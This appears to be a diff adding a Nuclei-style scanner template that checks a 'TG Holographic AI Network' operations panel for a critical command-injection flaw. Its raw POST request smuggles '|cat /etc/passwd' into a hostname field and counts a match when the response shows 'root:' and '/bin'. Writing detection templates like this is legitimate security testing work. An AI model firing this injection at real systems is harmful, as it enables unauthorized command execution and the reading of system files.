@@ -1,0 +1,38 @@
+id: tg-holographic-ai-network-rce
+info:
+  name: TG Holographic AI Network Operation and Maintenance RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  path:
+    - ping
+    - nslookup
+    - traceroute
+
+http:
+  - raw:
+      - |
+        POST /nmss/toolMenu/Ajax/ajax_system_set.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cmd={{path}}_hostname&hostname=127.0.0.1|cat /etc/passwd
+    payloads:
+      path: '{{path}}'
+    attack: clusterbomb
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root:"
+          - "/bin"
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
